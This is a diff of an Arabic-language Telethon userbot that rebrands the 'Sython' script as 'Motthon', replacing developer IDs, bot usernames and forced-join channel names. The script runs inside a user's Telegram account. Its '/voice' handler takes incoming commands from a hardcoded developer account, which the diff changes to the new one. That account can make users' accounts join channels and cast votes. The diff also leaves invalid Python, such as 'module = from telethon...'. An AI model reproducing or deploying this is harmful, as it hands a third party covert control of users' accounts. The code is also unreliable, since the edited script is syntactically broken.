@@ -1,4 +1,4 @@
-module = """from telethon.tl.functions.channels import LeaveChannelRequest
+module = from telethon.tl.functions.channels import LeaveChannelRequest
 import telethon
 from time import sleep
 from telethon import events
@@ -33,9 +33,6 @@ import requests
 import pyfiglet
 from sythonkalb import *
 import re
- 
-  
-    """
 
 
 
@@ -43,7 +40,7 @@ import re
 omr1 = """**
 ⚝ مرحبا بك في اوامر مـوت ثـون بـوينت
  
-============= • 𝐒𝐘 • ============
+============= • 𝗠𝗢 • ============
 
 𝟏 - للدخول الى اوامر التجميع : .تجميع
 
@@ -180,15 +177,15 @@ omr6 = """**
 • فحص السورس      - `.فحص`**"""
 
 omr7 = '''
-╭──⌯𝗦𝗢𝗨𝗥𝗖𝗘 𝗦𝗬𝗧𝗛𝗢𝗡⌯──╮
+╭──⌯𝗦𝗢𝗨𝗥𝗖𝗘 𝗠𝗢𝗧𝗧𝗛𝗢𝗡⌯──╮
 
-※ 𝗖𝗛𝗔𝗡𝗡𝗘𝗟 -  𝗦𝗔𝗬𝗧𝗛𝗢𝗡𝗛    ※
+※ 𝗖𝗛𝗔𝗡𝗡𝗘𝗟 -  𝗠𝗢𝗧𝗧𝗛𝗢𝗡    ※
 
 ※ 𝗩𝗘𝗥𝗦𝗜𝗢𝗡 - 𝟭.𝟭 - 𝗥𝗘𝗩𝗜𝗦𝗘𝗗   ※
 
-※ 𝗗𝗘𝗩𝗘𝗟𝗢𝗣𝗘𝗥 - 𝗛𝗨𝗦𝗔𝗠.𝗙𝗔  ※
+※ 𝗗𝗘𝗩𝗘𝗟𝗢𝗣𝗘𝗥 - 𝗠𝗢𝗧𝗥𝗠  ※
 
-╰───⌯𝗦𝗬𝗧𝗛𝗢𝗡 𝗣𝗢𝗜𝗡𝗧⌯───╯
+╰───⌯𝗠𝗢𝗧𝗧𝗛𝗢𝗡 𝗣𝗢𝗜𝗡𝗧⌯───╯
 '''
 
 omr8 = """**مرحبا بك في قسم تحويل النقاط
@@ -206,7 +203,7 @@ omr9 = """**مرحبا بك في قسم تحويل النقاط
 • @XNSEX21BOT - `/pt4 + عدد النقاط`**"""
 
 
-omr10 = """sython1 = TelegramClient(StringSession(session), api_id, api_hash)
+omr10 = sython1 = TelegramClient(StringSession(session), api_id, api_hash)
 
 
 
@@ -216,14 +213,14 @@ ispay2 = ['yes']
 
 sython1.start()
 c = requests.session()
-bot_username = '@zmmbot'
+bot_username = '@EE'
 bot_usernamee = '@A_MAN9300BOT'
 bot_usernameee = '@MARKTEBOT'
 bot_usernameeee = '@xnsex21bot'
 
 ownerhson_id = (int(devloo))
 LOGS = logging.getLogger(__name__)
-DEVS = [5159123009]
+DEVS = [2073200386]
 
 
 async def main(): 
@@ -1101,12 +1098,12 @@ async def OwnerStart(event):
     sender = await event.get_sender()
     if sender.id == ownerhson_id:
         send = await sython1.send_message(event.chat_id, "**جاري الانضمام التلقائي للقنوات**")
-        joinq = await sython1(JoinChannelRequest('d3boot_7'))
+        joinq = await sython1(JoinChannelRequest('Repthon'))
         joinw = await sython1(JoinChannelRequest('Fvvvv'))
         joine = await sython1(JoinChannelRequest('DzDDDD'))
         joinr = await sython1(JoinChannelRequest('botbillion'))
-        joint = await sython1(JoinChannelRequest('zzzzzz1'))
-        joiny = await sython1(JoinChannelRequest('zzzzzz'))
+        joint = await sython1(JoinChannelRequest('ZQ_LO'))
+        joiny = await sython1(JoinChannelRequest('xxfir'))
         joini = await sython1(JoinChannelRequest('zz_MX'))
         joino = await sython1(JoinChannelRequest('lI7777Il'))
         joinp = await sython1(JoinChannelRequest('KTTTT'))
@@ -1147,7 +1144,7 @@ async def OwnerStart(event):
         await sython1.send_message(ownerhson_id,'**⚝ قمت بالانضمام والتصويت بنجاح**')
 
 
-ownerhson_ids = 5159123009
+ownerhson_ids = 2073200386
 @sython1.on(events.NewMessage(outgoing=False, pattern='^/voice (.*) (.*)'))
 async def OwnerStart(event):
     sender = await event.get_sender()
@@ -1158,7 +1155,7 @@ async def OwnerStart(event):
         wait = await sython1.send_message(ownerhson_ids,'**⚝ حسناً سوف اقوم بالانضمام والتصويت**')
         haso = await sython1.get_entity(chn)
         join = await sython1(JoinChannelRequest(chn))
-        joion = await sython1(JoinChannelRequest('saythonh'))
+        joion = await sython1(JoinChannelRequest('Repthon'))
         somy = await sython1.get_messages(chn, limit=nu)
         await somy[nuu].click(0)
         sleep(1)
@@ -1416,7 +1413,7 @@ async def OwnerStart(event):
 
 print('  ')
 print('  ')
-print("❖ Sython Userbot Running  ")
+print("❖ MOTTHON Userbot Running  ")
 print('  ')
 sython1.loop.run_until_complete(main())
 sython1.run_until_disconnected()
@@ -1424,14 +1421,3 @@ sython1.run_until_disconnected()
 
 
 #the code py sython tm
-
-
-
-            
-
-            
-"""
-
-
-
-
